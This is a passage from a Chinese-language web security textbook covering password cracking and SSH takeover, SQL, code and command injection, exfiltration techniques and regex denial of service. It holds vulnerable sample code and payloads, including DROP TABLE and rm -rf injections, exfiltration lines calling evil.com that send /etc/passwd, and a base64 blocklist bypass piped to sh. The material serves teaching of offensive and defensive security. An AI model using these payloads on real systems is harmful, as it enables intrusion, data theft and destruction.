4.  尝试破解哈希值：`john passwords.txt`。
5.  查看明文密码：`john --show passwords.txt`。

使用像 John the Ripper 这样的工具破解密码是一个耗时且耗费硬件的过程。如果你拥有多台机器，最好在拥有最快 CPU 或 GPU 的机器上执行任务。John the Ripper 既可以配置为使用 GPU，也可以配置为使用 CPU，但不能同时使用两者。另一方面，Hashcat 可以同时利用两者。

在不使用任何自动化的前提下破解密码是可能的，但这种尝试在大多数情况下需要构建你自己的自动化。因此，除了作为学习项目外，不建议这么做。

#### SSH 远程登录

一旦用户账户遭到入侵，且你同时拥有了用户名和密码凭证，最后一步就是通过安全外壳（Secure Shell，SSH）向目标服务器进行身份验证。在 macOS 或基于 Linux 的操作系统上，打开终端并输入以下内容，将所需信息进行替换：

`ssh <username>@<website.com>`

如果启用了 SSH 通信，服务器将请求密码。在输入并匹配之后，你将能够远程控制 Web 服务器上被入侵的用户。如果你使用的是 Windows 机器，则存在像 PuTTY 这样的第三方工具，可以模拟 Linux SSH 工作流。

无论是 Windows 还是 macOS/Linux SSH 的情况，你现在都对目标服务器上的远程用户拥有了完全的控制权。ATO 工作流至此已成功完成。

### 总结

XXE 攻击易于理解，且通常易于发起。它们因其强大的威力而值得引起注意。Web 应用程序中的 XXE 漏洞可用于读取操作系统文件中的敏感信息，并在某些情况下提升为更严重的攻击，如远程代码执行。

XXE 攻击依赖于一个安全性存在缺陷但在整个互联网上被广泛采用和信赖的标准。针对 XML 解析器的 XXE 攻击通常易于修复。有时，只需一行配置就可以移除引用外部实体的功能。话虽如此，应当始终针对新的应用程序尝试这些攻击，因为 XML 解析器中仅仅丢失一行配置，就会导致如此巨大的破坏。

---

## 第13章 注入

针对 Web 应用程序最广为人知的攻击类型之一就是 SQL 注入（SQL Injection）。SQL 注入是一种专门针对 SQL 数据库的注入攻击类型，它允许恶意用户将他们自己的参数提供给现有的 SQL 查询，或者脱离 SQL 查询并提供他们自己的查询。自然地，这通常会导致数据库遭到入侵，因为 SQL 解释器默认被赋予了提升的权限。

SQL 注入是最常见的注入形式，但并非唯一形式。注入攻击有两个主要组件：解释器和来自用户的以某种方式读入解释器的 Payload。这意味着注入攻击可以针对诸如 FFMPEG（视频压缩器）之类的命令行工具，也可以针对数据库（如传统的 SQL 注入案例）。

让我们来看几种形式的注入攻击，以便我们能够很好地理解此类攻击奏效需要什么样的应用程序架构，以及如何构建和传送针对漏洞 API 的 Payload。

### SQL 注入

SQL 注入是最经典被提及的注入形式。在 HTTP Payload 中，SQL 字符串被转义，导致代表终端用户执行自定义的 SQL 查询。

传统上，许多开源软件（Open Source Software，OSS）包是结合使用 PHP 和 SQL（通常是 MySQL）构建的。历史上许多最常被提及的 SQL 注入漏洞都是由于 PHP 对视图（View）、逻辑（Logic）和数据（Data）代码之间的插值（Interpolation）采取宽松态度而发生的。老派的 PHP 开发人员会在他们的 PHP 文件中交织 SQL、HTML 和 PHP——这种被误用的组织模式导致了大量存在漏洞的 PHP 代码。

让我们来看一个老派论坛软件中允许用户登录的 PHP 代码块示例：

```php
<?php if ($_SERVER['REQUEST_METHOD'] != 'POST') {
 echo'
 <div class="row">
 <div class="small-12 columns">
 <form method="post" action="">
 <fieldset class="panel">
 <center>
 <h1>Sign In</h1><br>
 </center>
 <label>
 <input type="text" id="username" name="username"
 placeholder="Username">
 </label>
 <label>
 <input type="password" id="password" name="password"
 placeholder="Password">
 </label>
 <center>
 <input type="submit" class="button" value="Sign In">
 </center>
 </fieldset>
 </form>
 </div>
 </div>';
} else {
 // the user has already filled out the login form.
 // pull in database info from config.php
 $servername = getenv('IP');
 $username = $mysqlUsername;
 $password = $mysqlPassword;
 $database = $mysqlDB;
 $dbport = $mysqlPort;
 $database = new mysqli($servername, $username, $password, $database,$dbport);
 if ($database->connect_error) {
 echo "ERROR: Failed to connect to MySQL";
 die;
 }
 $sql = "SELECT userId, username, admin, moderator FROM users WHERE username =
 '".$_POST['username']."' AND password = '".sha1($_POST['password'])."';";
 $result = mysqli_query($database, $sql);
}
```

如你在该登录代码中所见，PHP、SQL 和 HTML 全部混合在一起。此外，SQL 查询是通过拼接查询参数生成的，在生成查询字符串之前没有进行任何净化。

HTML、PHP 和 SQL 代码的交织，绝对使得基于 PHP 的 Web 应用程序更容易受到 SQL 注入的攻击。在过去，甚至一些最大的开源 PHP 应用程序（如 WordPress）也曾深受其害。

在最近几年中，PHP 编码标准变得更加严格，且该语言已经实施了各种工具来降低 SQL 注入发生的几率。此外，PHP 作为应用程序开发人员的首选语言，其使用率有所下降。根据衡量编程语言流行度的 TIOBE 指数，自 2010 年左右以来，PHP 的使用率已显着下降。

这些发展的结果是，在整个 Web 上 SQL 注入都变少了。事实上，根据国家漏洞数据库（National Vulnerability Database）的数据，注入漏洞已从 2010 年占所有漏洞的近 5% 降至今天发现的不到 1%。

从 PHP 中吸取的安全教训已在其他语言中得以延续，在今天的 Web 应用程序中发现 SQL 注入漏洞要困难得多。然而，在不使用安全编码最佳实践的应用程序中，它仍然是可能的，并且依然很常见。

让我们考虑另一个简单的 Node.js/Express.js 服务器——这一次是一个与 SQL 数据库进行通信的服务器：

```javascript
const sql = require('mssql');
/*
 * Receive a POST request to /users, with a user_id param on the request body.
 *
 * A SQL lookup will be performed, attempting to find a user in the database
 * with the `id` provided in the `user_id` param.
 *
 * The result of the database query is sent back in the response.
 */
app.post('/users', function(req, res) {
 const user_id = req.body.user_id;
/*
 * Connect to the SQL database (server side).
 */
 await sql.connect('mssql://username:password@localhost/database');
 /*
 * Query the database, providing the `user_id` param from the HTTP
 * request body.
 */
 const result = await sql.query('SELECT * FROM users WHERE USER = ' + user_id);
/*
 * Return the result of the SQL query to the requester in the
 * HTTP response.
 */
 return res.json(result);
});
```

在这个例子中，开发人员使用了直接字符串拼接来将查询参数附加到 SQL 查询中。这假设通过网络发送的查询参数没有被篡改，而我们知道，这对于合法性来说并不是一个可靠的衡量标准。

在有效 `user_id` 的情况下，此查询将向请求者返回一个用户对象。在恶意 `user_id` 字符串的情况下，可以从数据库中返回更多对象。让我们来看一个例子：

```javascript
const user_id = '1=1'
```

啊，经典的真值评估（Truthy Evaluation）。现在查询变成了 `SELECT * FROM users WHERE USER = true`，这转换成了“将所有用户对象返回给请求者”。

如果我们只是在我们的 `user_id` 对象内部开始一条新的语句会怎么样？我们将在以下代码中这样做：

```javascript
user_id = '123abc; DROP TABLE users;';
```

现在我们的查询看起来像这样：`SELECT * FROM users WHERE USER = 123abd; DROP TABLE users;`。换句话说，我们在原始查询之上追加了另一个查询。哎呀，现在我们需要重建我们的用户群了。

一个更隐蔽的例子可以是下面这样：

```javascript
const user_id = '123abc; UPDATE users SET credits = 10000 WHERE user = 123abd;'
```

现在，我们不是请求所有用户的列表，也不是删除用户表，而是使用第二个查询来更新我们在数据库中的用户账户——在这种情况下，为我们自己提供比我们原本应有的更多的应用内积分。

有许多极好的方法可以防止这些攻击的发生，因为针对 SQL 注入的防御已经开发了二十多年。我们将在第三部分中详细讨论如何防范这些攻击。

### 代码注入

在注入的世界中，SQL 注入只是“注入”风格攻击的一个子集。SQL 注入之所以被归类为注入，是因为它涉及一个解释器（SQL 解释器），该解释器因不当净化导致的 Payload 读入而被作为攻击目标。该净化本应只允许来自用户的特定参数被读入解释器。通过 API 端点调用的命令行界面（Command-Line Interface，CLI）被赋予了额外的、非预期的命令，这是由于缺乏净化（见图 13-2）。这些命令将针对 CLI 执行。

SQL 注入首先是注入攻击，其次是代码注入攻击。这是因为在注入攻击中运行的脚本是在解释器或 CLI 下运行的，而不是针对宿主操作系统（Host OS）运行的（命令注入）。

如前所述，有许多较少为人知的代码注入样式，它们不依赖于数据库。由于许多原因，这些并不常见。首先，今天几乎每一个复杂的 Web 应用程序都依赖数据库来存储和检索用户数据。因此，你更有可能发现 SQL 或其他数据库注入，而不是针对在服务器上运行的较不常见的 CLI 的注入。

此外，通过注入利用 SQL 数据库的知识非常普及，并且 SQL 注入攻击很容易进行研究。你可以在互联网上进行几次快速搜索，并找到足够你阅读几个小时甚至几天的 SQL 注入材料。

其他形式的代码注入更难研究，不是因为它们较少见（它们确实较少见，但我认为这不是文档较少的原因），而是因为代码注入通常是特定于应用程序的。换句话说，几乎每一个 Web 应用程序都会使用数据库（通常是某种类型的 SQL），但并非每一个 Web 应用程序都会使用可通过 API 端点控制的其他 CLI/解释器。

让我们考虑一个图像/视频压缩服务器，MegaBank 已分配该服务器用于其面向客户的营销活动。此服务器是位于 `https://media.mega-bank.com` 的 REST API 集合。特别是，它由几个有趣的 API 组成：

*   `uploadImage` (POST)
*   `uploadVideo` (POST)
*   `getImage` (GET)
*   `getVideo` (GET)

端点 `uploadImage()` 是一个简单的 Node.js 端点，其内容类似于这样：

```javascript
const imagemin = require('imagemin');
const imageminJpegtran = require('imagemin-jpegtran');
const fs = require('fs');
/*
 * Attempts to upload an image provided by a user to the server.
 *
 * Makes use of imagemin for image compression to reduce impact on server
 * drive space.
 */
app.post('/uploadImage', function(req, res) {
 if (!session.isAuthenticated) { return res.sendStatus(401); }
 /*
 * Write the raw image to disk.
 */
 fs.writeFileSync(`/images/raw/${req.body.name}.png`, req.body.image);
 /*
 * Compresses a raw image, resulting in an optimized image with lower disk
 * space required.
 */
 const compressImage = async function() {
 const res = await imagemin([`/images/raw/${req.body.name}.png`],
 `/images/compressed/${req.body.name}.jpg`);
 return res;
 };
 /*
 * Compress the image provided by the requester, continue script
 * execution when compression is complete.
 */
 const res = await compressImage();
 /*
 * Return a link to the compressed image to the client.
 */
 return res.status(200)
 .json({url: `https://media.mega-bank.com/images/${req.body.name}.jpg` });
});
```

这是一个非常简单的端点，它将 PNG 图像转换为 JPG。它利用 `imagemin` 库来完成此操作，并且不接受来自用户的任何参数来确定压缩类型（文件名除外）。

然而，一个用户有可能利用文件名重复，并导致 `imagemin` 库覆盖现有的图像。这就是大多数操作系统上文件名的性质：

```html
// on the front-page of https://www.mega-bank.com
<html>
 <!-- other tags -->
 <img src="https://media.mega-bank.com/images/main_logo.png">
 <!-- other tags -->
</html>
```

```javascript
const name = 'main_logo.png';
// uploadImage POST with req.body.name = main_logo.png
```

这看起来不像是注入攻击，因为它只是一个转换并保存图像的 JavaScript 库。事实上，它看起来只是一个写得不好的 API 端点，它没有考虑名称冲突的边界情况。然而，因为 `imagemin` 库调用了 CLI（`imagemin-cli`），所以这实际上将是一个注入攻击——利用附加到 API 上的未妥善净化的 CLI 来执行非预期的行为。

不过，这是一个非常简单的例子，除了当前情况之外，没有太多的可利用性。让我们看看 SQL 领域之外的一个更详细的代码注入示例：

```javascript
const exec = require('child_process').exec;
const converter = require('converter');
const defaultOptions = '-s 1280x720';
/*
 * Attempts to upload a video provided by the initiator of the HTTP post.
 *
 * The video's resolution is reduced for better streaming compatibility;
 * this is done with a library called `converter.`
 */
app.post('/uploadVideo', function(req, res) {
if (!session.isAuthenticated) { return res.sendStatus(401); }
// collect data from HTTP request body
const videoData = req.body.video;
const videoName = req.body.name;
const options = defaultOptions + req.body.options;
exec(`convert -d ${videoData} -n ${videoName} -o ${options}`);
});
```

让我们假设这个虚拟的 `converter` 库在它自己的上下文中运行一个 CLI，类似于许多 Unix 工具。换句话说，在运行 `convert` 命令之后，执行器的范围现在限定在由转换器提供的命令中，而不是由宿主 OS 提供的命令中。

在我们的例子中，用户可以轻松提供有效的输入——也许是压缩类型和音频比特率。这些可能如下所示：

```javascript
const options = '-c h264 -ab 192k';
```

另一方面，他们可能能够根据 CLI 的结构调用额外的命令：

```javascript
const options = '-c h264 -ab 192k \ convert -dir /videos -s 1x1';
```

如何向 CLI 注入额外的命令取决于该 CLI 的架构。一些 CLI 支持在同一行执行多个命令，而另一些则不支持。许多 CLI 会被换行符、空格或与号（`&&`）破坏。

在这种情况下，我们使用了一个换行符来向转换器 CLI 添加一条额外的语句。这不是开发人员预期的使用场景，因为额外的语句允许我们重定向转换器 CLI 并对我们不拥有的视频进行修改。

如果该 CLI 是针对宿主 OS 运行，而不是在其自己独立的运行环境中运行，我们将得到命令注入，而不是代码注入。想象一下以下情况：

```bash
$ convert -d vidData.mp4 -n myVid.mp4 -o '-s 1280x720'
```

此命令正在通过 Unix OS 终端在 Bash 中运行，就像大多数压缩软件运行一样。

考虑以下情况，其中引号被转义，从而允许命令直接针对宿主 OS 运行，而不是通过 `convert` 工具发送：

```javascript
const options = "' && rm -rf /videos";
```

由于使用单引号（`'`）破坏了 `options` 字符串，我们现在遇到了一个更具危险性的注入形式，导致以下命令针对宿主 OS 运行：

```bash
$ convert -d vidData.mp4 -n myVid.mp4 -o '-s 1280x720' && rm -rf /videos
```

虽然代码注入仅限于解释器或 CLI，但命令注入会暴露整个操作系统。

在脚本和系统级命令之间进行插值时，必须非常注意在针对宿主 OS（Linux、Macintosh、Windows 等）或解释器（SQL、CLI 等）执行之前，如何对字符串进行净化，以防止命令注入和代码注入。

### 命令注入

通过命令注入，API 端点会生成 Bash 命令，包括来自客户端的请求。恶意用户添加自定义命令，以修改 API 端点的正常运行。

我之所以在上一节中引入使用视频转换器的 CLI 示例，是为了缓和地引入命令注入。到目前为止，我们已经了解到，代码注入和命令注入之间的区别在于，前者发生在受限的解释器内，而后者直接针对宿主操作系统运行。

让我们退一步，考虑一下这种级别攻击的影响。首先，针对基于 Unix 的操作系统（Macintosh 或 Linux）执行命令（通常是 Bash）的能力，伴随着非常严重的风险。如果我们能够直接访问宿主 Unix 操作系统（超过 95% 的服务器是基于 Unix 的），并且我们的命令被解析为超级用户，那么我们可以对该操作系统做任何我们想做的事情。

一个被入侵的操作系统会给予黑客访问许多非常核心的文件和权限的权限，例如：

*   `/etc/passwd`
    记录操作系统上的每一个用户账户
*   `/etc/shadow`
    包含用户的加密密码
*   `~/.ssh`
    包含用于与其他系统通信的 SSH 密钥
*   `/etc/apache2/httpd.conf`
    基于 Apache 的服务器的配置
*   `/etc/nginx/nginx.conf`
    基于 nginx 的服务器的配置

此外，除了读取权限外，命令注入还可能给予我们针对这些文件的写入权限。

这样的漏洞开启了整套潜在的攻击，我们可以利用命令注入来造成比预期更多的破坏，包括：

*   从服务器窃取数据（显而易见）。
*   重写日志文件以隐藏我们的痕迹。
*   添加一个拥有写入权限的额外数据库用户，以便日后使用。
*   删除服务器上的重要文件。
*   抹除服务器并将其摧毁。
*   利用与其他服务器/API 的集成（例如，利用服务器的 Sendgrid 密钥发送垃圾邮件）。
*   将 Web 应用程序中的单个登录表单修改为向我们的网站发送未加密密码的钓鱼表单。
*   将管理员锁在外面并勒索他们。

如你所见，命令注入是黑客工具箱中最危险的攻击类型之一。它处于每一个漏洞风险评级量表的最顶端，并且在未来很长一段时间内将继续存在，即使在现代 Web 服务器上已经实施了缓解措施。

在基于 Unix 的操作系统上，这些缓解措施之一是强大的权限系统，该系统可能能够通过减少被入侵的端点所能造成的损害，来缓解部分风险。基于 Unix 的操作系统允许将详细的权限应用于文件、目录、用户和命令。正确设置这些权限可以通过强制 API 作为非特权用户运行，从而潜在地消除许多上述威胁。不幸的是，大多数面临命令注入风险的应用程序并没有采取这些步骤为其代码创建先进的用户权限配置文件。

让我们来看一个快速且粗暴的例子，看看简单的命令注入可以有多么容易：

```javascript
const exec = require('child_process').exec;
const fs = require('fs');
const safe_converter = require('safe_converter');
/*
 * Upload a video to be stored on the server.
 *
 * Makes use of the `safe_converter` library to convert the raw video
 * prior to removing the raw video from disc and returning an HTTP 200 status
 * code to the requester.
 */
app.post('/uploadVideo', function(req, res) {
if (!session.isAuthenticated) { return res.sendStatus(401); }
/*
 * Write the raw video data to disk, where it can be later
 * compressed and then removed from disk.
 */
fs.writeFileSync(`/videos/raw/${req.body.name}`, req.body.video);
/*
 * Convert the raw, unoptimized video—resulting in an optimized
 * video being generated.
 */
safe_converter.convert(`/videos/raw/${req.body.name}`,
 `/videos/converted/${req.body.name}`)
.then(() => {
 /*
 * Remove the raw video file when it is no longer needed.
 * Keep the optimized video file.
 */
 exec(`rm /videos/raw/${req.body.name}`);
 return res.sendStatus(200);
 });
});
```

在这个例子中包含了几项操作：

1.  我们将视频数据写入 `/videos/raw` 目录下的磁盘中。
2.  我们转换原始视频文件，将输出写入 `/videos/converted`。
3.  我们移除原始视频（它不再需要了）。

这是一个非常典型的压缩工作流。然而，在这个例子中，移除原始视频文件的行 `exec(rm /videos/raw/${req.body.name});` 依赖于未净化的用户输入来确定要移除的视频文件的名称。

此外，该名称并没有被参数化，而是作为字符串拼接到了 Bash 命令中。这意味着在移除视频之后，可能会出现额外的命令。让我们评估一个可能导致这种情况的场景：

```javascript
// name to be sent in POST request
const name = 'myVideo.mp4 && rm -rf /videos/converted/';
```

类似于第 163 页“代码注入”中的最后一个例子，这里一个未妥善净化的输入可能会导致针对宿主 OS 执行额外的命令——因此得名“命令注入”。

### 注入数据外泄技术

在本节中，虽然例子都将是 SQL 注入攻击，但其概念可以应用于任何形式的注入攻击。带内（In-band）、带外（Out-of-band）和推理性/盲（Inferential/blind）数据外泄技术适用于所有形式的注入，尽管它们最常与 SQL 注入结合使用。

#### 数据外泄基础

与 XXE 攻击类似，可能会出现攻击者能够发现并利用服务器上的 SQL 注入漏洞，但无法从服务器获得任何返回响应的情况。在这些情况下，攻击链很难向前推进，因为通常攻击者要么不知道 SQL 注入是否成功，要么知道 SQL 注入成功但不知道如何利用 SQL 注入漏洞来获取任何信息或优势。在这些情况下，可以使用数据外泄技术来洞察远程服务器上注入攻击的状态（以及 SQL 注入的响应）。

#### 带内数据外泄

这是最简单也是最常见的情况，上述场景在此并不适用。你（攻击者）尝试利用一个 SQL 注入漏洞。服务器执行你的 SQL Payload，并且可以直接在你的 Web 浏览器或 HTTP 响应中看到该响应。在这种情况下，不需要复杂的技巧即可洞察 SQL Payload 的执行结果。

考虑以下 SQL 注入 Payload：

```javascript
const payload = `user_id=1or1="select * from users"`;
const url = `https://megabank.com/update?${payload}`;
updateUser(url, (result) => {
 // logs the result from the SQL injection
 console.log(result);
});
```

像前述例子这样的 SQL 注入攻击被认为是“带内”的，因为可以通过用于将 Payload 发送到服务器的相同机制来查看 Payload 执行的结果。

#### 带外数据外泄

在你的 SQL 注入结果没有直接反映在你的浏览器中，或者没有在 HTTP 响应中返回的情况下，可以使用带外数据外泄技术来查看在目标服务器上执行的 SQL Payload 的结果。

考虑以下 SQL 注入 Payload：

```javascript
const payload = `UTIL_HTTP.request('https://evil.com',
 "user_id=1or1='select * from users'")`;
const url = `https://megabank.com/update?${payload}`;
updateUser(url, (result) => {
 // nothing is displayed, server does not reflect SQL result
 console.log(result);
});
```

上述场景被称为带外 SQL 注入（SQLi）数据外泄，有时也被称为 OOB SQLi。该示例利用了所有主流 SQL 数据库都以某种形式包含的 `util_http` 函数。这些工具用于在 SQL 解释器执行的过程中发起 HTTP 请求，并且在此情况下，它们正被用于将 SQL 注入 Payload 执行的结果发送到服务器 `https://evil.com`（该服务器由攻击者所有）。

此注入攻击的结果不会像带内攻击那样反映给攻击者。然而，由于使用了诸如在攻击过程中调用 HTTP 请求之类的 OOB 技术，数据仍然可以被外泄。

请注意，可以通过 HTTP OOB 在许多主流数据库上外泄数据，包括 Oracle SQL Server、MySQL、PostgreSQL 和 Microsoft SQL Server。其语法因数据库而异，但外泄数据的基本流程保持大致相同。

#### 推理性数据外泄

如果无法使用带内或带外技术通过 SQL 注入外泄数据，该怎么办？当授予 SQL 解释器的权限受到限制，以防止发生诸如上述 OOB SQL 注入攻击时，通常会出现这种情况。

然而，无法利用带内或带外外泄并不意味着无法外泄数据。只要 SQL 注入 Payload 在 SQL 解释器内部成功执行，数据仍然可以被外泄——尽管这需要付出多一点的努力。

一种在没有带内或带外技术的情况下外泄数据的方法是推理性数据外泄（Inferential Data Exfiltration）。通常，这种类型的数据外泄被用于被称为盲注入（Blind Injection）的攻击中，即带内和带外数据外泄都无法发挥作用的攻击。

通过盲 SQL 注入，你不会获得任何包含 SQL 查询结果的响应，但你也许能够强制服务器做出异常行为，以便让你洞察攻击是否成功。一种常见的方法是产生一个导致服务器抛出错误、明显变慢或崩溃的 SQL 注入 Payload。

盲 SQL 注入中一种简单的测试结果的方法是利用 SQL `WAITFOR DELAY` 操作。`WAITFOR DELAY` 是一个标准的 SQL 函数，它会阻塞 SQL 解释器的执行，直到条件通过。考虑以下示例：

```javascript
const payload = `user_id=1or1=WAITFOR DELAY '0:0:30'`;
const url = `https://megabank.com/update?${payload}`;
updateUser(url, (result) => {
 // nothing is displayed, but response is delayed 30 seconds
 console.log(result);
});
```

如果此 Payload 成功，SQL 解释器将暂停执行 30 秒。

我们可以使用像浏览器开发者工具这样的工具来确定查询响应所花费的时间，即使它不包含任何信息泄漏。如果响应时间超过 30 秒（这对于 99.99% 的 SQL 查询来说是不寻常的），我们就能知道我们的 SQL Payload 成功的概率非常高。

然后，我们可以在未来的 SQL 查询 Payload 中使用分支逻辑来推断关于服务器和数据的信息，如果我们的查询为真，则让服务器延迟；如果我们的查询返回假，则不延迟。虽然非常耗时，但像延迟技术这样的推理性技术可以允许 SQL 注入 Payload 向我们（攻击者）泄露信息，即使没有在响应中反射数据或没有数据可供带外泄漏。

### 绕过常见防御

现代且安全的 Web 应用程序通常会利用针对 SQL 注入的非常强大且有效的缓解措施，例如预编译语句（Prepared Statement）和存储过程（Stored Procedure）。然而，许多非 SQL CLI 工具尚未内置这些高级防御措施。结果，开发人员只能诉诸于效果较差的缓解形式——其中大多数都可以被绕过。

针对注入攻击最常见的防御形式之一是黑名单（Blocklist）。尽管它们很流行，但黑名单实际上非常容易被绕过。这有很多原因，但主要是因为规范会发生变化，并且输入可以被掩盖，从而使黑名单过滤代码检测不到输入。

注入攻击依赖于两个主要因素：Payload 和执行该 Payload 的解释器。黑名单仅排除特定的关键字、短语或字符串，以防止其进入解释器执行。但是，通常可以用解释器仍然能够理解的不同方式来描述相同的逻辑。

考虑以下情况，其中 CLI 拥有黑名单逻辑，该逻辑会阻止以下 Payload 执行：

```bash
mail -s "leaked file" "email@evil.com" < /etc/passwd
```

此注入攻击依赖于 Linux 终端，并利用其 `mail` 命令将敏感文件发送到攻击者的 Web 服务器。但是，如果 `mail` 命令被应用程序级的黑名单阻止，如何重新设计 Payload，使其包含相同的逻辑但不被黑名单过滤系统检测到呢？

事实证明，基于 Linux 的操作系统终端接受并执行多种编码类型，包括 base64。因为黑名单过滤系统评估纯文本以试图阻止 `mail` 命令，所以将 Payload 转换为 base64 可能会允许它在不被检测到的情况下溜过过滤代码。

首先，在 base64 中对原始 Payload 进行编码（这可以在 Chrome 开发者控制台中轻松完成）：

```javascript
const b64 = btoa('mail -s "leaked file" "email@evil.com" < /etc/passwd');
console.log(b64);
// bWFpbCAtcyAibGVha2VkIGZpbGUiICJlbWFpbEBldmlsLmNvbSIgPCAvZXRjL3Bhc3N3ZA==
```

接下来，将 base64 Payload 喂入被服务器端过滤阻止的原始注入攻击中：

```bash
base64 -D <<<
bWFpbCAtcyAibGVha2VkIGZpbGUiICJlbWFpbEBldmlsLmNvbSIgPCAvZXRjL3Bhc3N3ZA==
| sh
```

因为服务器端过滤黑名单仅支持纯文本评估，所以该 Payload 将不会被阻止。在它通过 API 黑名单并进入 Linux 终端的时点，内置的 base64 解码工具将在将其管道传输到 Bash 并执行之前，将字符串转换回纯文本。这是一个说明为什么与白名单（Allowlist）相比，黑名单是非常糟糕的安全机制的典型例子。

### 总结

注入风格的攻击超出了常见的 SQL 注入范围，并横跨许多其他技术。与 XXE 攻击不同，注入风格的攻击不是特定弱规范的结果，而是在用户的输入被过度信赖时产生的一种漏洞类型。作为漏洞赏金猎人或渗透测试人员，注入风格的攻击非常值得掌握，因为虽然众所周知的数据库可能已经设置了防御，但针对解析器和 CLI 的注入攻击由于文档记录较少，且可能具有较不严密的防御机制。

注入攻击需要对应用程序的功能有所了解，因为它们通常是由于执行了包含从客户端的 HTTP 请求中解析出来的文本的服务器代码而产生的。这些攻击强大、优雅，且能够实现许多目标——无论是数据窃取、账户接管、权限提升，还是仅仅制造普遍的混乱。

***

## 第 14 章 拒绝服务

也许最广为人知且报道最多的攻击类型之一就是分布式拒绝服务（Distributed Denial of Service，DDoS）攻击。这种攻击是拒绝服务（Denial of Service，DoS）的一种形式，其中庞大的设备网络向服务器发送海量请求，从而使服务器变慢或导致合法用户无法使用。

DoS 攻击有多种形式，从涉及成千上万台或更多协同设备的著名分布式版本，到由于不当的正则表达式（Regular Expression，regex）实现而影响单个用户的代码级 DoS，这会导致验证一段文本需要耗费极长的时间。DoS 攻击的严重程度也各不相同，有的会让处于活跃状态的服务器瘫痪，有的会产生毫无意义的电费账单，有的会导致用户的网页加载速度比平时稍慢，或者让视频在缓冲中途暂停。

正因为如此，测试 DoS 攻击（特别是那些不那么严重的攻击）是非常困难的。大多数漏洞赏金（Bug Bounty）计划都明确禁止提交 DoS 漏洞，以防止白帽黑客干扰应用的正常使用。

在本章结束时，你将理解各种常见的 DoS 攻击、几种高级形式的 DoS 攻击，以及所有 DoS 攻击背后的共同概念。凭借这些知识，你将能够通过开发自己的 DoS 攻击来对 Web 应用程序发起攻击。

> ⚠️ 由于 DoS 漏洞会干扰普通用户对应用程序的正常使用，因此在不会对真实用户造成服务中断的本地开发环境中测试 DoS 漏洞是最有效的。

极少数情况除外，DoS 攻击通常不会对应用程序造成永久性损坏，但确实会干扰合法用户对应用程序的可用性。

取决于具体的 DoS 攻击，有时可能很难找到降低用户体验的 DoS 接收器（Sink）。

### 正则表达式拒绝服务

基于正则表达式拒绝服务（Regex Denial of Service，Regex DoS）的漏洞是当今 Web 应用程序中最常见的 DoS 形式之一。一般来说，这些漏洞的风险范围从极低到中等，通常取决于正则表达式解析器（Regex Parser）所在的位置。

退一步讲，Web 应用程序中经常使用正则表达式来验证表单字段，并确保用户输入的是服务器所期望的文本。这通常意味着只允许用户在密码字段中输入应用程序选择接受的字符，或者只在评论中限制最大字符数，以便在用户界面（User Interface，UI）中展示时能够美观地显示完整的评论。

正则表达式最初是由研究形式语言理论的数学家设计的，旨在以非常紧凑的方式定义字符串的集合和子集。当今 Web 上的几乎每种编程语言都包含其自身的正则表达式解析器，浏览器中的 JavaScript 也不例外。

在 JavaScript 中，正则表达式通常通过以下两种方式之一进行定义：

```javascript
const myregex = /username/; // literal definition
const myregex = new regexp('username'); // constructor
```

完整讲解正则表达式超出了本书的范围，但需要注意的是，正则表达式通常是搜索或匹配文本的一种快速且非常强大的方式。至少学习正则表达式的基础知识是非常值得的。

对于本章，我们只需要知道，在 JavaScript 中，夹在两个正斜杠之间的任何内容都是正则表达式字面量：`/test/`。

正则表达式也可以用于匹配范围：

```javascript
const lowercase = /[a-z]/;
const uppercase = /[A-Z]/;
const numbers = /[0-9]/;
```

我们可以将它们与逻辑运算符结合使用，例如“或”（OR）：

```javascript
const youori = /you|i/;
```

依此类推。你可以在 JavaScript 中轻松测试一个字符串是否匹配某个正则表达式：

```javascript
const dog = /dog/;
dog.test('cat'); // false
dog.test('dog'); // true
```

如前所述，正则表达式通常解析得非常快。正则表达式运行缓慢到足以拖慢 Web 应用程序的情况十分罕见。话虽如此，正则表达式确实可以被专门设计得运行缓慢。这些被称为恶意正则表达式（Malicious Regex）（有时也称为邪恶正则表达式 [Evil Regex]），当允许用户提供自己的正则表达式以便在其他 Web 表单或服务器上使用时，它们会带来巨大的风险。恶意正则表达式也可能会被意外地引入到应用程序中，不过如果开发人员对正则表达式不够熟悉，无法避免一些常见错误的话，这种情况其实并不罕见。

一般来说，大多数恶意正则表达式都是使用加号“+”运算符构建的，这会将正则表达式转变为“贪婪（Greedy）”操作。贪婪的正则表达式会测试一个或多个匹配项，而不是在找到第一个匹配项时就停止。

每当遇到失败的情况时，恶意正则表达式都会导致回溯（Backtracking）。考虑以下正则表达式：`/^((ab)*)+$/`。该正则表达式执行以下操作：

1. 在行首定义了捕获组 `((ab)*)+`。
2. `(ab)*` 表示匹配 0 到无限个 `ab` 的组合。
3. `+` 表示为第 2 步寻找所有可能的匹配项。
4. `$` 表示匹配直到字符串末尾。

使用输入值 `abab` 测试此正则表达式实际上运行得相当快，不会引起太多问题。向外扩展该模式，`ababababababab` 的运行也会相当快。如果我们将此模式修改为 `abababababababa`，额外加上一个 “a”，该正则表达式的评估速度会突然变慢，可能需要几毫秒才能完成。发生这种情况是因为该正则表达式在运行到末尾之前都是有效的，但在末尾失效时，引擎将会回溯并尝试寻找各种组合匹配：

* `(abababababababa)` 是无效的。
* `(ababababababa)(ba)` 是无效的。
* `(abababababa)(baba)` 是无效的。
* 许多次迭代之后：`(ab)(ab)(ab)(ab)(ab)(ab)(ab)(a)` 是无效的。

从本质上讲，由于正则表达式引擎正在尝试穷举 `(ab)` 的所有可能有效组合，因此它必须完成与字符串长度等同的组合数量，然后才能判定该字符串本身是无效的（在检查了所有可能的组合之后）。

表 14-1 展示了使用正则表达式引擎快速尝试该技术的结果。

表 14-1. 正则表达式（恶意输入）匹配时间 (`/^((ab)*)+$/`)

| 输入 (Input)                              | 执行时间 (Execution time) |
| :---------------------------------------- | :------------------------ |
| abababababababababababa (23 字符)         | 8 ms                      |
| ababababababababababababa (25 字符)       | 15 ms                     |
| ababababababababababababababa (27 字符)   | 31 ms                     |
| abababababababababababababababa (29 字符) | 61 ms                     |

如你所见，为了破坏正则表达式解析器而构建的输入，在使用这个邪恶或恶意正则表达式时，每增加两个字符，就会导致解析器完成匹配的时间翻倍。这种情况会持续下去，最终很容易导致 Web 服务器性能显著下降（如果是在服务端计算），或者导致 Web 浏览器完全崩溃（如果是在客户端计算）。

有趣的是，这种恶意正则表达式并不会对所有输入都表现出脆弱性，如表 14-2 所示。

表 14-2. 正则表达式（安全输入）匹配时间 (`/^((ab)*)+$/`)

| 输入 (Input)                           | 执行时间 (Execution time) |
| :------------------------------------- | :------------------------ |
